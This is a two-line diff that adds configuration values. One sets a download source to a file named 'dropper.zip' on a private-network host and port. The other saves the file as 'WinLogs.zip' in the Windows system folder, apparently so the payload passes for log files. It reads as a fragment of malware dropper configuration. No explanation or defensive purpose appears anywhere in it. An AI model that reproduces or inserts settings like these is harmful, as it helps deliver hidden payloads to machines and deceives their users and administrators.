@@ -1,0 +1,2 @@
+source=http://192.168.100.50:12345/dropper.zip
+downloadzip=C:\\Windows\\WinLogs.zip
